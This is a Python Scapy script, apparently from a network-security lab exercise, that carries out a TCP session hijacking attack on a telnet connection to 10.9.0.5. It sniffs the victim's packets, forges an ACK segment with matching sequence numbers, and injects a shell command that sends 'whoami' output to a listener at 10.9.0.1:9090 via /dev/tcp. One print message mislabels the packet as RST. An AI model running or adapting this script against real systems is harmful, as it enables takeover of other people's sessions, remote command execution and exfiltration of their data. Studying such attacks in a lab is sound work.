from scapy.all import *
import subprocess

ip_victim = "10.9.0.5"
IFACE = subprocess.run(["ifconfig | grep br- | cut -d: -f1"], shell = True, capture_output=True, text= True).stdout
print(f"Listen on {IFACE}")
data = b"\n whoami > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\n"

def send_h(pkt):
    if pkt[IP].src == ip_victim:
        print("capture a packet")
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        
        payload_len = 0

        if pkt.haslayer(Raw):
            payload_len = len(pkt.getlayer(Raw))

        seq_num = pkt[TCP].ack 
        ack_num = pkt[TCP].seq + payload_len

        tcp = TCP(
            sport=pkt[TCP].dport,
            dport=pkt[TCP].sport,
            flags="A",             
            seq=seq_num,
            ack=ack_num,
            window=pkt[TCP].window
        )
        
        h_pkt = ip / tcp / data

        h_pkt.show()

        print("Sending RST packet...")
        send(h_pkt, iface=IFACE, verbose=1)
        print("Packet correctly sent")
        exit(0)

pkt = sniff(iface=IFACE, filter='tcp and src port 23', prn = send_h)

